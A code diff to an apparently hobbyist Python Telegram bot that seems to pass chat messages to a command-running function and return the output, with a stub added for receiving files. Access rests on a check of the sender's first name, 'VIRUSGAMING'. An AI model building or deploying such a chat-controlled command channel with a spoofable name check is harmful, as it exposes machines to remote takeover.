@@ -14,8 +14,24 @@ bot = Client("bot", API_ID, API_HASH)
 async def on_message(client, message):
     global whait_for_filename, change_dir
     ID = message.chat.id
+    rute = os.getcwd()
     msg = message.text
-    user = message.user
+    user = message.from_user.first_name
+    try:
+        Fsize = message.document.file_size
+        try:
+            os.mkdir('Downloads')
+        except:
+            pass
+        """
+        Aqui hay q hacer q pueda recivir un archivo
+        """
+        os.access(rute,3)
+        os.chdir(rute)
+        print('terminating')
+        return
+    except:
+        pass
 
     if user != "VIRUSGAMING" and CheckSecure():
         await bot.send_message(ID,"Access denied...")
@@ -36,10 +52,9 @@ async def on_message(client, message):
         whait_for_filename = True
     else:
         cmd = command(msg)
-        if cmd == "":
-            cmd = "no commands..."
     try:
         await bot.send_message(ID, cmd)
     except:
         pass
+
 bot.run()
